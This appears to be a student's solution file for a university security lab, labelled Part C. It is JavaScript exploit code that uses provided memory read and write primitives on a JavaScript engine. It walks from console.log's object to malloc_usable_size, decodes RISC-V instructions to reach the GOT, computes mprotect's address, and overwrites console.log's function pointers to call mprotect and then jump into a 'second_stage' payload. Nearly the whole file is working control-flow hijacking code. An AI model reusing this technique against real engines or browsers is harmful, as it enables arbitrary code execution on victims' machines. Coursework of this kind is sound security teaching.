/*
 * TODO: Part C solution goes here!
 */

// ctx leads to rt leads to js malloc usable size
const ctx = cs361s.readmem(cs361s.addrof(console.log) + 48);
const rt = cs361s.readmem(ctx + 24);
const jsMallocUsableSize = cs361s.readmem(rt + 24);
const auipc = cs361s.readmem(jsMallocUsableSize) >>> 12 << 12; // 20 immediate bits
const load = cs361s.readmem(jsMallocUsableSize + 4) >> 20; // 12 immediate bits
//GOT = game of thrones :)
const gameofthrones = cs361s.readmem(jsMallocUsableSize + auipc + load);
//get address of mprotect by decrementing malloc usable size address
const addressmprotect = gameofthrones - 0x31B00;//difference between malloc and protect
const secondstageaddress = cs361s.addrof(second_stage);
const num = Math.pow(10, -320) * 2.0237;
const addressconsole = cs361s.addrof(console.log);

cs361s.writemem(addressconsole + 48, secondstageaddress);
cs361s.writemem(addressconsole + 56, addressmprotect);
console.log.apply(num, null); 
cs361s.writemem(addressconsole + 56, secondstageaddress + 16); 

console.log();
